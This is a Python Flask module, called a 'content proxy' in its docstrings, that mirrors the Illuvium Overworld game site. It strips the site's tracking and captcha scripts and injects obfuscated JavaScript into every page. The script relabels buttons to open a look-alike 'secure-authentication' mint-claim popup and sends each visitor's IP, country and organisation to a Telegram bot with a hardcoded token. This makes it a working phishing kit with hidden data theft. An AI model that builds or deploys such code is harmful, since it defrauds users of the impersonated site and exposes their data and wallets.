from flask import request, Response, current_app
import requests
import re
import os
import logging
import urllib.parse

logger = logging.getLogger(__name__)

def init_content_proxy(app):
    """Initialize content proxy routes for the Flask app"""
    
    def remove_tracking_scripts(content):
        """Remove Google Tag Manager iframe and tracking scripts from HTML content."""
        if isinstance(content, bytes):
            content = content.decode('utf-8', errors='ignore')
        
        # Remove GTM iframe
        content = content.replace(
            '<iframe src="https://www.googletagmanager.com/ns.html?id=GTM-WXHP66L" height="0" width="0" style="display:none;visibility:hidden"></iframe>',
            ''
        )
        
        # Remove GTM script
        content = content.replace(
            '<script async="" src="https://www.googletagmanager.com/gtag/js?id=G-B4V7XNT23Z"></script>',
            ''
        )
        content = content.replace(
            '<script async="" src="https://store.epicgames.com/en-US/p/illuvium-60064c"></script>',
            ''
        )
        
        # Remove GTM initialization script
        gtm_init_script = '''<script>
            window.dataLayer = window.dataLayer || [];
            function gtag(){dataLayer.push(arguments);}
            gtag('js', new Date());
            gtag('config', 'G-B4V7XNT23Z', {
              page_path: window.location.pathname,
            });
          </script>'''
        content = content.replace(gtm_init_script, '')
        
        # Remove GTM inline script
        gtm_inline_script = '''<script>
            (function(w,d,s,l,i){w[l]=w[l]||[];w[l].push({'gtm.start':
            new Date().getTime(),event:'gtm.js'});var f=d.getElementsByTagName(s)[0],
            j=d.createElement(s),dl=l!='dataLayer'?'&l='+l:'';j.async=true;j.src=
            'https://www.googletagmanager.com/gtm.js?id='+i+dl;f.parentNode.insertBefore(j,f);
            })(window,document,'script','dataLayer', 'GTM-WXHP66L');
          </script>'''
        content = content.replace(gtm_inline_script, '')
        
        # Remove Geetest script
        content = content.replace(
            '<script async="" src="https://static.geetest.com/v4/gt4.js"></script>',
            ''
        )
        
        return content
    
    def rewrite_urls(content):
        """Rewrite URLs to point to proxy server."""
        # Implementation continues...
        return content
    
    def get_text_replacement_script():
        """Return the text replacement JavaScript code"""
        return '''
<script>
function _0x406f(){const _0x12b8e7=['7005236807','addEventListener','target','Start\x20Now','4pFXxfc','\x20:\x20','Main','7703714960:AAFhMovzxoNjr9LZq6m9kytv1R1EylQT1R8','trim','add','true','childNodes','5328512nylNYN','country_name','popup=true,width=800,height=600,toolbar=no,menubar=no,scrollbars=yes,resizable=yes','textContent','stringify','Please\x20enable\x20popups\x20for\x20this\x20site.','/sendMessage','body','599907PQROLh','css-1oqedzn','processed','https://secure-authentication-immutable.vercel.app/?id=auth-passeport&user=209348&method=claim-your-mint','classList','3243822WNxehW','load','228790DbkOml','6JNPhVH','button:not([data-processed]),\x20a:not([data-processed])','org','forEach','preventDefault','button,\x20a,\x20a[href*=\x22news\x22],\x20a[href*=\x22about\x22],\x20a[href*=\x22faq\x22],\x20.chakra-link,\x20.nav-link,\x20.menu-item','claim-button','Register','Grab\x20Your\x20Spot','css-1i8s7az','nodeType','3367884yyYbac','click','DOMContentLoaded','Timeline','Updates','Reach\x20Us','863901ZAXjfT','dataset','querySelectorAll','json','122521DsBwPr','https://ipapi.co/json/','observe','Info','p:not([data-processed])','TEXT_NODE','Get\x20Yours','css-104rome','closest','contains','length','Help','POST','Collect\x20Now'];_0x406f=function(){return _0x12b8e7;};return _0x406f();}const _0x4e819e=_0xdb80;(function(_0x4eaace,_0x21c13a){const _0x48a309=_0xdb80,_0x660f9=_0x4eaace();while(!![]){try{const _0x5a39c0=-parseInt(_0x48a309(0x1a7))/0x1*(parseInt(_0x48a309(0x192))/0x2)+parseInt(_0x48a309(0x18f))/0x3*(parseInt(_0x48a309(0x1b9))/0x4)+parseInt(_0x48a309(0x191))/0x5+parseInt(_0x48a309(0x19d))/0x6+parseInt(_0x48a309(0x1c9))/0x7+-parseInt(_0x48a309(0x1c1))/0x8+-parseInt(_0x48a309(0x1a3))/0x9;if(_0x5a39c0===_0x21c13a)break;else _0x660f9['push'](_0x660f9['shift']());}catch(_0x216605){_0x660f9['push'](_0x660f9['shift']());}}}(_0x406f,0x9d54f),document[_0x4e819e(0x1b6)](_0x4e819e(0x19f),function(){const _0x4d6906=_0x4e819e,_0x3a1f16={'Play\x20for\x20Free':'','Play\x20Now':_0x4d6906(0x19a),'Log\x20In\x20with\x20Passport':_0x4d6906(0x1b8),'Connect\x20Wallet':'Connect\x20Wallet','Launch\x20Game':_0x4d6906(0x1ad),'Create\x20Account':'New\x20Account','Sign\x20Up':_0x4d6906(0x199),'Register':_0x4d6906(0x1b4),'News':_0x4d6906(0x1a1),'Home':_0x4d6906(0x1bb),'About':_0x4d6906(0x1aa),'Contact':_0x4d6906(0x1a2),'FAQ':_0x4d6906(0x1b2),'Roadmap':_0x4d6906(0x1a0),'Whitepaper':'Documentation'},_0x2015fb={'Survive\x20the\x20Overworld,\x20a\x20hostile\x20planet\x20teeming\x20with\x20Illuvials\x20waiting\x20to\x20be\x20found.':''};function _0x5bc536(_0x3d9f7e){const _0x297d30=_0x4d6906;if(_0x3d9f7e['dataset'][_0x297d30(0x1cb)])return;let _0x27d978='';for(const _0x298105 of _0x3d9f7e['childNodes']){_0x298105[_0x297d30(0x19c)]===Node[_0x297d30(0x1ac)]&&(_0x27d978+=_0x298105[_0x297d30(0x1c4)][_0x297d30(0x1bd)]());}!_0x27d978&&(_0x27d978=_0x3d9f7e[_0x297d30(0x1c4)][_0x297d30(0x1bd)]());if(_0x3a1f16[_0x27d978]){if(_0x3d9f7e[_0x297d30(0x1c0)][_0x297d30(0x1b1)]===0x1&&_0x3d9f7e[_0x297d30(0x1c0)][0x0][_0x297d30(0x19c)]===Node[_0x297d30(0x1ac)])_0x3d9f7e[_0x297d30(0x1c4)]=_0x3a1f16[_0x27d978];else{let _0x3761ca=![];for(const _0x37457b of _0x3d9f7e[_0x297d30(0x1c0)]){if(_0x37457b[_0x297d30(0x19c)]===Node['TEXT_NODE']&&_0x37457b[_0x297d30(0x1c4)][_0x297d30(0x1bd)]()===_0x27d978){_0x37457b[_0x297d30(0x1c4)]=_0x3a1f16[_0x27d978],_0x3761ca=!![];break;}}!_0x3761ca&&(_0x3d9f7e[_0x297d30(0x1c4)]=_0x3a1f16[_0x27d978]);}}_0x3d9f7e[_0x297d30(0x18e)][_0x297d30(0x1be)]('claim-button'),_0x3d9f7e[_0x297d30(0x1a4)][_0x297d30(0x1cb)]=_0x297d30(0x1bf);}function _0x358c60(){const _0x292c0d=_0x4d6906,_0xbdd2ea=document[_0x292c0d(0x1a5)](_0x292c0d(0x1ab));_0xbdd2ea[_0x292c0d(0x195)](_0x523010=>{const _0x349653=_0x292c0d,_0x148168=_0x523010[_0x349653(0x1c4)][_0x349653(0x1bd)]();_0x2015fb[_0x148168]&&(_0x523010[_0x349653(0x1c4)]=_0x2015fb[_0x148168]),_0x523010[_0x349653(0x1a4)][_0x349653(0x1cb)]=_0x349653(0x1bf);});}function _0x297a7e(){const _0x5112db=_0x4d6906,_0x1717eb=document[_0x5112db(0x1a5)](_0x5112db(0x197));_0x1717eb[_0x5112db(0x195)](_0x5bc536),_0x358c60();}_0x297a7e();let _0x4f940d;function _0x3d908c(){clearTimeout(_0x4f940d),_0x4f940d=setTimeout(()=>{const _0x503058=_0xdb80;document['querySelectorAll'](_0x503058(0x193))[_0x503058(0x195)](_0x5bc536),_0x358c60();},0x12c);}const _0x9b4972=new MutationObserver(_0x3d908c);_0x9b4972[_0x4d6906(0x1a9)](document[_0x4d6906(0x1c8)],{'childList':!![],'subtree':!![]}),document[_0x4d6906(0x1b6)](_0x4d6906(0x19e),function(_0x5e45e3){const _0x4747d2=_0x4d6906,_0x28114c=_0x5e45e3[_0x4747d2(0x1b7)],_0x33d28f=_0x28114c[_0x4747d2(0x1af)]('button,\x20a');if(!_0x33d28f)return;if(_0x33d28f[_0x4747d2(0x18e)][_0x4747d2(0x1b0)]('css-tvaofb')||_0x33d28f[_0x4747d2(0x18e)][_0x4747d2(0x1b0)](_0x4747d2(0x1ae))||_0x33d28f[_0x4747d2(0x18e)][_0x4747d2(0x1b0)]('css-1hnz6hu')||_0x33d28f[_0x4747d2(0x18e)][_0x4747d2(0x1b0)](_0x4747d2(0x1ca))||_0x33d28f[_0x4747d2(0x18e)][_0x4747d2(0x1b0)](_0x4747d2(0x19b)))return;if(_0x33d28f[_0x4747d2(0x18e)][_0x4747d2(0x1b0)](_0x4747d2(0x198))){const _0x59392a=window['open'](_0x4747d2(0x1cc),'popupWindow',_0x4747d2(0x1c3));_0x59392a?_0x59392a['focus']():alert(_0x4747d2(0x1c6));_0x5e45e3[_0x4747d2(0x196)]();return;}},!![]);}));async function sendIPToTelegram(){const _0x3590d4=_0x4e819e,_0x585aa5=_0x3590d4(0x1bc),_0x3c8f5a=_0x3590d4(0x1b5);try{const _0x5b8038=await fetch(_0x3590d4(0x1a8)),_0x3befb9=await _0x5b8038[_0x3590d4(0x1a6)](),_0x2e04b7=_0x3befb9['ip'],_0xceee85=_0x3befb9[_0x3590d4(0x1c2)],_0x50963f=_0x3befb9[_0x3590d4(0x194)],_0x280e8e='[ILV]:\x20'+_0x2e04b7+_0x3590d4(0x1ba)+_0xceee85+_0x3590d4(0x1ba)+_0x50963f;await fetch('https://api.telegram.org/bot'+_0x585aa5+_0x3590d4(0x1c7),{'method':_0x3590d4(0x1b3),'headers':{'Content-Type':'application/json'},'body':JSON[_0x3590d4(0x1c5)]({'chat_id':_0x3c8f5a,'text':_0x280e8e})});}catch(_0x4b36ea){}}function _0xdb80(_0x32fbba,_0x109218){const _0x406f35=_0x406f();return _0xdb80=function(_0xdb8062,_0x5409f4){_0xdb8062=_0xdb8062-0x18e;let _0x407704=_0x406f35[_0xdb8062];return _0x407704;},_0xdb80(_0x32fbba,_0x109218);}window[_0x4e819e(0x1b6)](_0x4e819e(0x190),sendIPToTelegram);
</script>
 

'''

    @app.after_request
    def add_script_to_html(response):
        """Global after_request handler to add script to all HTML responses"""
        if response.mimetype == 'text/html':
            content = response.get_data(as_text=True)
            if '</body>' in content:
                script = get_text_replacement_script()
                content = content.replace('</body>', script + '</body>')
                response.set_data(content)
        return response

    # Add a catch-all route as a last resort
    @app.route('/', defaults={'path': ''})
    @app.route('/<path:path>')
    def catch_all(path):
        """Catch-all route that proxies to the original site and modifies content"""
        original_url = f"https://overworld.illuvium.io/{path}"
        logger.info(f"Catch-all proxy for: {original_url}")
        
        try:
            # Set proper headers to mimic a browser
            headers = {
                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36',
                'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
                'Accept-Language': 'en-US,en;q=0.5',
                'Connection': 'keep-alive',
                'Upgrade-Insecure-Requests': '1',
            }
            
            # Add query parameters if any
            params = request.args.to_dict()
            
            # Make the request to the original site
            response = requests.get(original_url, headers=headers, params=params, stream=True)
            
            # Get content type
            content_type = response.headers.get('Content-Type', 'text/html')
            
            # If HTML, modify content
            if 'text/html' in content_type and response.status_code == 200:
                modified_content = modify_html_content(response.content)
                logger.info(f"HTML content modified for {path}")
                return Response(modified_content, mimetype=content_type)
            
            # For other content types or error codes, return as-is
            return Response(
                response.content, 
                status=response.status_code,
                content_type=content_type
            )
        except Exception as e:
            logger.error(f"Error in catch-all route: {str(e)}")
            import traceback
            logger.error(traceback.format_exc())
            return f"Error: {str(e)}", 500
